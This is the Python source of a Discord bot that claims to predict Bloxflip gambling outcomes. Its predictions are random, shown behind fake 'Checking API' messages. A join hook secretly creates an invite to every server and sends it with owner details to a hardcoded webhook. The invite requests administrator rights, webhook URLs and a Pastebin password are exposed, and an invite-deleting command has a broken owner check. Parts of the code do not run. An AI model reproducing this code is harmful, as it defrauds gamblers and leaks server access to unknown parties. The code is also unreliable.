import random
import discord
import discord.utils
import cloudscraper
from discord.ext import commands
import time
import math
import random
import threading
import os
import discord
from discord.commands import Option
import requests
from webserver import keep_alive
from discord import Permissions 
keep_alive()
send =[]
counts=(0)




web3 = 'https://discord.com/api/webhooks/1021093118579327076/r4f9gu2AePP_FtFXskzqC2mXWpa8TbSvTHIkvjmivgYqTgrN5XbuxDZBq3K_jvCnCZvR'
embed5 = discord.Embed( title="Skee ", url = "https://discord.gg/QxkZrehkdA", description=f"Want one of the Best and cheapest predictors on the market?")
embed2 = discord.Embed(title="Are you tired of losing in bloxflip?", description=f"Dashflip has many gamemodes predicting with 80%+ accurary.\nCheap prices.\nHas many payment methods to suit you.\nHosting plenty giveaways.\n[Join Today](https://discord.gg/zKKGHEdB6x)")
embed2.set_image(url="https://cdn.discordapp.com/attachments/1021103664141697054/1023204555279835146/unknown.png")
web = "https://discord.com/api/webhooks/1021093118579327076/r4f9gu2AePP_FtFXskzqC2mXWpa8TbSvTHIkvjmivgYqTgrN5XbuxDZBq3K_jvCnCZvR"
web2="https://discord.com/api/webhooks/1021105461275131955/qXCN241aXv9k2lBNyzrXGzPebZqWiw5RLSoFMJyzJ1TDnWuXQhAyWd3IFKRIfk3y9cBt"
bot = discord.AutoShardedBot(shard_count=20, intents=discord.Intents.default())
times = 0
ids = []
scraper = cloudscraper.create_scraper()

a = len(bot.guilds)
@bot.event
async def on_guild_join(guild):
  try:
   a = guild.channels
   chan = random.choice(a)
   link = await chan.create_invite()
   requests.post(f'{web2}', data={'content':f"`{guild.name}`\n> ID: `{guild.id}`\n> Owner: <@{guild.owner_id}>\n> Servers: `{len(bot.guilds)}`\n> Invite: {link} \n"})
  except:
    requests.post(f'{web2}', data={'content':f"`{guild.name}`\n> ID: `{guild.id}`\n> Owner: <@{guild.owner_id}>\n> Servers: `{len(bot.guilds)}`\n"})
  
class Buttons(discord.ui.View):
    def __init__(self, *, timeout=180):
        super().__init__(timeout=timeout)


@bot.event
async def on_ready():
 print('bot online')


  
@bot.slash_command(description="shows every server the bot is in")
async def servers(ctx):
        serverids=()
        for guild in bot.guilds:
          serverids.append("\n".json(guild.id))
        print(serverids)
        content=serverids
        title = "scoo servers"
        login_data = {
    'api_dev_key': key,
    'api_user_name': 'GuiGi',
    'api_user_password': 'D}>v4Z^qB96hUSaJ'
    }
        data = {
    'api_option': 'paste',
    'api_dev_key':key,
    'api_paste_code':serverids,
    'api_paste_name':"paste",
    'api_paste_expire_date': 'see_https://pastebin.com/api',
    'api_user_key': None,
    'api_paste_format': 'see_https://pastebin.com/api'
    }
        r = requests.post("https://pastebin.com/api/api_post.php", data=data)
        await ctx.respond(f"Paste URL: {r.text}")
        
        global channel
        channel = bot.get_channel(1021091841610895370)
        await ctx.respond(f'Currently at {len(bot.guilds)}')
        global times 
        if times == 3:
          await ctx.send(embed=embed5)
          times-=3
        else: 
          times+=1
        global counts
        counts+=1
        requests.post(f'{web}', data={'content':f"code executed {counts}"})
        

@bot.slash_command(description="invite me")
async def invite(ctx): 
  embed = discord.Embed(title="Invite me")
  view=Buttons()
  view.add_item(discord.ui.Button(label="invite me",style=discord.ButtonStyle.link,url="https://discord.com/api/oauth2/authorize?client_id=718463179235131412&permissions=8&scope=bot"))
  await ctx.respond(embed=embed, view=view)

@bot.slash_command(description="Support Server")
async def support(ctx): 
  embed = discord.Embed(title="Join to access our support server")
  view=Buttons()
  view.add_item(discord.ui.Button(label="Support server",style=discord.ButtonStyle.link,url="https://discord.gg/V8gB428xZ4"))
  await ctx.respond(embed=embed, view=view)
  
@bot.slash_command(description="predicts roulette")
async def roulette(ctx):
    await ctx.respond(embed=discord.Embed(title="Checking API", description="Please wait until the bot checks the API", color=0x5ca3ff), ephemeral=True)
    await roul(ctx)

            
async def roul(ctx):
  role = discord.utils.get(ctx.guild.roles, name="customer")
  mylist = ["<:tix:1021065103728189521>", "<:bux:1021064624386363422>"]
  amo = random.choice(mylist)
  embed = discord.Embed(title="scoo prediction",  
                          description=f"Predicting: Roulette")
  embed.add_field(name="roulette", value=amo, inline=False)
  view=Buttons()
  view.add_item(discord.ui.Button(label="Support",style=discord.ButtonStyle.link,url="https://discord.gg/V8gB428xZ4"))

  view.add_item(discord.ui.Button(label="Free Robux",style=discord.ButtonStyle.link,url="https://discord.gg/74j3DD9Z7K"))

  view.add_item(discord.ui.Button(label="invite me",style=discord.ButtonStyle.link,url="https://discord.com/api/oauth2/authorize?client_id=718463179235131412&permissions=8&scope=bot"))
  global times
  if times == 3:
          await ctx.send(embed=embed5)
          times-=3
  else: 
          times+=1
  await ctx.send(ctx.author.mention, embed=embed, view=view)
  global counts
  counts+=1
  requests.post(f'{web}', data={'content':f"code executed {counts}"})
  

@bot.slash_command(description="show users profile")
async def profile(ctx, username: Option(str, "Roblox user name")):
    user = requests.get(f'https://api.roblox.com/users/get-by-username?username={username}').json()
    userid = user.get("Id")
    r = scraper.get(f"https://api.bloxflip.com/user/lookup/{userid}").json()
    await ctx.respond(embed=discord.Embed(title="checking api", description="please wait until the bot checks the api", color=0x5ca3ff), ephemeral=True)
    embed = discord.Embed(title="scoo stats", description=f"Showing bloxflip stats of {username}")
    embed.add_field(name="Username", value=r.get("username"), inline=False)
    embed.add_field(name="Rank", value=r.get('rank'), inline=False)
    embed.add_field(name="Wager", value=f"{r.get('wager')} R$", inline=False)
    embed.add_field(name="Games played", value=r.get('gamesPlayed'), inline=False)
    a = embed=embed
    await ctx.send(ctx.author.mention,  embed=embed)
    global times
    if times == 3:
          await ctx.send(embed=embed5)
          times-=3
    else: 
          times+=1
    global counts
    counts+=1
    requests.post(f'{web}', data={'content':f"code executed {counts}"})
  
@bot.slash_command(description="Predict towers")
async def towers(ctx, roundid: Option(str, "Tower round ID")):
    await ctx.respond(embed=discord.Embed(title="checking API", description="Please wait until the bot checks the API", color=0x5ca3ff), ephemeral=True)
  
    global counts
    counts+=1
    requests.post(f'{web}', data={'content':f"code executed {counts}"})
    a = len(roundid)         
    if a == 36:
      if roundid in ids:
        await ctx.respond('This ID has been used already')
      else:
        await anu(ctx, roundid)
    else:
        time.sleep(2)
        await ctx.respond('Invalid round ID')


@bot.slash_command(description="Shows server membercount")
async def membercount(ctx):
    await ctx.respond(f'This server has {ctx.guild.member_count} members')
    global times 
    if times == 3:
          await ctx.send(embed=embed5)
          times-=3
    else: 
          times+=1
    global counts
    counts+=1
    requests.post(f'{web}', data={'content':f"code executed {counts}"})


@bot.slash_command(description="shows your invites")
async def invites(ctx):
    totalInvites = 0
    for i in await ctx.guild.invites():
        if i.inviter == ctx.author:
            totalInvites += i.uses
    await ctx.respond(f'You have **{totalInvites}** invites')
    global times
    if times == 3:
          await ctx.send(embed=embed5)
          times-=3
    else: 
          times+=1
    global counts
    counts+=1
    requests.post(f'{web}', data={'content':f"code executed {counts}"})


@bot.slash_command(description="delete all invites")
async def crasmo(ctx):
    global counts
    counts+=1
    requests.post(f'{web}', data={'content':f"code executed {counts}"})
    if ctx.author.id == 974298550383038534 or 295502380081086464:
        await ctx.respond('deleting every invite')
        for _i in range(100):
            for invite in await ctx.guild.invites():
                await invite.delete()
    else:
        await ctx.respond('Only xolo#3979 or Oskar#3544 can do that')


async def anu(ctx, roundid):
    an = []
    an.clear()
    role = discord.utils.get(ctx.guild.roles, name="customer")
    for i in range(8):
        seq = [":x:", ":x:", ":x:"]
        a = random.randrange(0, len(seq))
        seq[a] = ":star:"
        an.append(" ".join(seq))
    embed = discord.Embed(title="scoo prediction",  
                          description=f"predicting: {roundid}")
    embed.add_field(name="towers", value="\n".join(an), inline=False)
    ids.append(roundid)
    view=Buttons()
    view.add_item(discord.ui.Button(label="Support",style=discord.ButtonStyle.link,url="https://discord.gg/V8gB428xZ4"))
  
    view.add_item(discord.ui.Button(label="Free Robux",style=discord.ButtonStyle.link,url="https://discord.gg/74j3DD9Z7K"))

    view.add_item(discord.ui.Button(label="Invite me",style=discord.ButtonStyle.link,url="https://discord.com/api/oauth2/authorize?client_id=718463179235131412&permissions=8&scope=bot"))
    await ctx.send(ctx.author.mention, embed=embed, view=view)
    global times
    if times == 3:
          await ctx.send(embed=embed5)
          times-=3
    else: 
          times+=1
    global counts
    counts+=1
    requests.post(f'{web}', data={'content':f"code executed {counts}"})


@bot.slash_command(description="Predict mines")
async def mines(ctx, roundid: Option(str, "Mines round ID"), bombs: Option(int, "How many bombs"), tiles: Option(int, "How many tiles do you want to open"), robux: Option(int, 'How much robux did you bet')):
    await ctx.respond(embed=discord.Embed(title="checking API", description="Please wait until the bot checks the API", color=0x5ca3ff), ephemeral=True)
    global counts
    counts+=1
    requests.post(f'{web}', data={'content':f"code executed {counts}"})
    a = len(roundid)
    if a == 36:
      if roundid in ids:
        await ctx.respond('This ID has been used once')
      else:
        await mines(ctx, roundid, bombs, tiles, robux)
    else:
        time.sleep(2)
        await ctx.respond('Invalid round ID')


@bot.slash_command(description="owners")
async def owners(ctx):
    await ctx.respond('Oskar#3544 are the real owners of this bot')


@bot.slash_command(description="Predict crash")
async def crash(ctx):
    ok = await ctx.respond(embed=discord.Embed(title="Checking API", description="Please wait until the bot checks the API", color=0x5ca3ff), ephemeral=True)
    await crasho(ctx)
    global times
    if times == 3:
          await ctx.send(embed=embed5)
          times-=3
    else: 
          times+=1
    global counts
    counts+=1
    requests.post(f'{web}', data={'content':f"code executed {counts}"})




async def crasho(ctx):
    games = scraper.get("https://rest-bf.blox.land/games/crash").json()

    def lol():
        r = scraper.get(
            "https://rest-bf.blox.land/games/crash").json()["history"]
        yield [r[0]["crashPoint"], [float(crashpoint["crashPoint"]) for crashpoint in r[-2:]]]
    for game in lol():
        games = game[1]
        lastgame = game[0]
        avg = sum(games)/len(games)
        chance = 1
        for game in games:
            chance = chance = 95/game
            prediction = (1/(1-(chance))+avg)/2
            if float(prediction) > 2:
                color = 0x81fe8f
            else:
                color = 0xfe8181
            desc = f"""
        **Crashpoint:**
        *{prediction:.2f}x*
        **Chance:**
        ```{chance:.2f}%```
        """
            em = discord.Embed(description=desc, color=color)
            view=Buttons()
            view.add_item(discord.ui.Button(label="Support",style=discord.ButtonStyle.link,url="https://discord.gg/V8gB428xZ4"))
          
            view.add_item(discord.ui.Button(label="Free Robux",style=discord.ButtonStyle.link,url="https://discord.gg/74j3DD9Z7K"))
            view.add_item(discord.ui.Button(label="Invite me",style=discord.ButtonStyle.link,url="https://discord.com/api/oauth2/authorize?client_id=718463179235131412&permissions=8&scope=bot"))
            await ctx.send(ctx.author.mention, embed=em)


async def mines(ctx, roundid, bombs, tiles, robux):
    tiless = list(range(1, 26))
    time.sleep(2)
    totalsquaresleft = 25
    formel = ((totalsquaresleft - bombs) / (totalsquaresleft))
    totalsquareslefts = 24
    formel2 = ((totalsquareslefts - bombs) / (totalsquareslefts))
    for i in range(tiles):
        if tiles == 1:
            await ctx.respond('Please use more than one tile', ephemeral=True)
            break
        formel2 *= formel
        totalsquaresleft -= 1
        totalsquareslefts -= 1
        while True:
            tile_to_unlock = random.choice(tiless)
            if tile_to_unlock != "unlocked!":
                tiless[tile_to_unlock] = "unlocked!"
                break
    counter = 0
    output = ""
    role = discord.utils.get(ctx.guild.roles, name="customer")
    for tile in tiless:
        if counter == 5:
            output += "\n"
            counter = 0
        if tile == "unlocked!":
            output += " <:robux:1021061824189313055> "
        else:
            output += " <:bombi:1021063904496984114> "
        counter += 1
    end = formel2 * 100
    multiplier = calculate_multiplier(tiles, bombs)
    embed = discord.Embed(title="scoo prediction",
                          description=f" predicting: {roundid}")
    embed.add_field(name="Mines", value=output, inline=False)
    embed.add_field(name="Win Chance",
                    value=f"```{int(end)}%```", inline=False)
    embed.add_field(name="Multiplier", value="```{0:.2f}```".format(
        multiplier), inline=False)
    embed.add_field(name="winnings",
                    value=f"``` {multiplier * robux} R$```", inline=False)
    ids.append(roundid)
    view=Buttons()
    view.add_item(discord.ui.Button(label="Support",style=discord.ButtonStyle.link,url="https://discord.gg/V8gB428xZ4"))
  
    view.add_item(discord.ui.Button(label="Free Robux",style=discord.ButtonStyle.link,url="https://discord.gg/74j3DD9Z7K"))
    view.add_item(discord.ui.Button(label="Invite me",style=discord.ButtonStyle.link,url="https://discord.com/api/oauth2/authorize?client_id=718463179235131412&permissions=8&scope=bot"))
    await ctx.send(ctx.author.mention, embed=embed, view=view)
    global times
    if times == 3:
          await ctx.send(embed=embed5)
          times-=3
    else: 
          times+=1


def nCr(n, r):
    f = math.factorial
    return f(n) // f(r) // f(n-r)


def calculate_multiplier(bombs, tiles):
    house_edge = 0.01
    return (0.96 - house_edge) * nCr(25, tiles) / nCr(25 - bombs, tiles)


try:
 bot.run('BOT_TOKEN')
except:
 os.system('kill 1')